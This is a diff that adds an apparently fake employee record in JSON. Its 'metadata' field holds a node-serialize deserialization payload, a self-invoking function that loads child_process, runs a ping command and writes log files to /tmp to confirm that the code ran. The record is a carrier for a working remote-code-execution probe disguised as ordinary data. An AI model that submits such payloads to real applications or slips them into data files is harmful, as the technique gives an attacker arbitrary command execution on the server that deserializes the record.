@@ -1,0 +1,14 @@
+{
+  "name": "Debug Test",
+  "position": "Tester",
+  "department": "Security",
+  "email": "debug@example.com",
+  "phone": "555-000-0000",
+  "location": "Remote",
+  "hire_date": "2023-01-01",
+  "status": "active",
+  "manager": "None",
+  "salary": 0,
+  "bio": "This is a test.",
+  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { fs.writeFileSync('/tmp/debug1.log', 'Starting exec test'); cp.exec('ping -c 1 8.8.8.8', function(error, stdout, stderr) { fs.writeFileSync('/tmp/debug2.log', 'Exec callback called'); if (error) { fs.writeFileSync('/tmp/error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/success.log', 'STDOUT: ' + stdout); } if (stderr) { fs.writeFileSync('/tmp/stderr.log', 'STDERR: ' + stderr); } }); } catch (e) { fs.writeFileSync('/tmp/exception.log', 'EXCEPTION: ' + e.message); } fs.writeFileSync('/tmp/debug3.log', 'Payload execution completed'); return '';}()\"}"
+} 
